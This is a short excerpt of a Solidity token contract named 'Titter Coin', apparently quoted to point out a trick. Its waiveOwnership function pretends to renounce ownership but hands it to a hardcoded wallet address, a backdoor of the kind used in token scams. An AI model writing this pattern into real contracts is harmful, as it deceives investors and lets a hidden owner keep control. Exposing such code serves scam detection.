...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xf5aB8FA5d9B9687353B550426d9aa0c65645Ab7E));
        _owner = address(0xf5aB8FA5d9B9687353B550426d9aa0c65645Ab7E);
    }
...
contract Titter is Context, IERC20, Ownable {
    ...
    string private _name = "Titter Coin";
